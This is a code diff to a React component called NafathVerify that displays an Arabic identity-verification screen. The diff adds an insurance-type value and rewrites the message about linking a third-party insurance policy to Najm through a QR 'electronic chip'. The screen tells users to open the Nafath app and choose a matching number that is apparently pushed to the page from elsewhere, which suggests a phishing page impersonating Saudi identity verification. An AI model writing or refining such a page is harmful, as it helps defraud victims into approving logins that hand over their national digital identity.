@@ -18,6 +18,7 @@ export default function NafathVerify() {
   const [code, setCode] = useState<string>("");
   const [userPhone, setUserPhone] = useState<string>("");
   const [serviceName, setServiceName] = useState<string>("");
+  const [insuranceType, setInsuranceType] = useState<string>("");
   const [countdown, setCountdown] = useState<number>(0); // 0 = no timer
   const [showResendButton, setShowResendButton] = useState(false);
 
@@ -37,6 +38,7 @@ export default function NafathVerify() {
     const service = localStorage.getItem('selectedService') || new URLSearchParams(window.location.search).get('service') || '';
     setUserPhone(phone);
     setServiceName(service);
+    setInsuranceType(localStorage.getItem('insuranceType') || 'ضد الغير');
   }, []);
 
   // Subscribe to verification code changes
@@ -149,7 +151,7 @@ export default function NafathVerify() {
           />
           <h1 className="text-xl font-bold text-gray-800 mb-2">التحقق من الهوية</h1>
           <p className="text-[#049c94] text-sm leading-relaxed">
-            سيتم إصدار شريحة الكترونية (QR CODE) مرتبطة برقم جوالك <span className="font-bold">{userPhone || '05xxxxxxxx'}</span> ليتم ربط خدمة <span className="font-bold">{serviceName || 'الخدمة المطلوبة'}</span> مع معلومات الإتصال الخاصة بك
+            سيتم إصدار شريحة الكترونية (QR CODE) مرتبطة برقم جوالك <span className="font-bold">{userPhone || '05xxxxxxxx'}</span> ليتم ربط خدمة <span className="font-bold">وثيقة التأمين {insuranceType}</span> مع معلومات الإتصال الخاصة بك بنجم المرور
           </p>
           <p className="text-gray-500 text-sm mt-2">
             افتح تطبيق نفاذ واختر الرقم المطابق
